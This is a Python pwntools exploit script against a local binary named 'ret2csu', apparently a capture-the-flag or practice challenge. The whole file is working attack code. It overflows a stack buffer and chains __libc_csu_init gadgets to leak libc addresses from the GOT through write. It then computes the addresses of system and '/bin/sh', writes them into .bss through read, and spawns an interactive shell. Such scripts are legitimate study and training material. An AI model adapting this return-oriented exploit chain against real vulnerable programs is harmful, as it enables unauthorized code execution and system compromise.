#!/usr/bin/env python3
from pwn import *
context.log_level = 'DEBUG'

sh = process('./ret2csu')

elf_ret2csu = ELF('./ret2csu')
elf_libc = ELF('./libc.so.6')

write_plt = elf_ret2csu.plt['write']

libc_start_main_got = elf_ret2csu.got['__libc_start_main']
write_got = elf_ret2csu.got['write']
read_got = elf_ret2csu.got['read']

start_addr = 0x0000000000400460

csu_addr_1 = 0x00000000004005F0
csu_addr_2 = 0x0000000000400606

# libc_csu_init: callq *(%r12, %rbx, 8)
# attention:r12 is not the direct func addr. r12 is ptr to area which stores func addri
# (so we can pass got addr to r12)
# rdi=edi=r13d rsi=r14 rdx=r15


def csu(r12, r13, r14, r15, last):
    rbx = 0  # callq *(%r12, %rbx, 8)
    rbp = 1  # for not to jump in jne <__libc_csu_init+0x50>
    payload = b'a' * 0x88
    payload += p64(csu_addr_2) + b'a'*8 + p64(rbx) + p64(rbp) + \
        p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_addr_1) + b'a' * 0x38
    payload += p64(last)
    sh.sendline(payload)


sh.recv()
#sh.recvuntil('Hello, World\n')
csu(write_got, 1, libc_start_main_got, 8, start_addr)

libc_start_main_addr = u64(sh.recv(8))
print('libc start main addr:' + hex(libc_start_main_addr))


sh.recv()
csu(write_got, 1, read_got, 8, start_addr)
read_addr = u64(sh.recv(8))
print('read addr:' + hex(read_addr))


#libc_base = write_addr - elf_libc.symbols['write']
libc_base = libc_start_main_addr - elf_libc.symbols['__libc_start_main']
print("libc base addr:" + hex(libc_base))

system_addr = libc_base + elf_libc.symbols['system']
print('system addr:' + hex(system_addr))

bin_sh_addr = libc_base + next(elf_libc.search(b'/bin/sh'))
print("bin/sh addr:" + hex(bin_sh_addr))

read_addr = libc_base + elf_libc.symbols['read']
print('read addr:' + hex(read_addr))

read_got = 0x0000000000601008

bss_addr = 0x0000000000601028
# sh.recv()
sh.recvuntil('Hello, World\n')
csu(read_got, 0, bss_addr, 18, start_addr)
sh.sendline(p64(system_addr) + b"/bin/sh\x00")
#payload = b'A' * 0x88 + p64(system_addr) + p64(0) + p64(bin_sh_addr)

# sh.recv()
sh.recvuntil("Hello, World\n")
#csu(bss_addr, bin_sh_addr, 0, 0, start_addr)
csu(bss_addr, bss_addr + 8, 0, 0, start_addr)
sh.interactive()
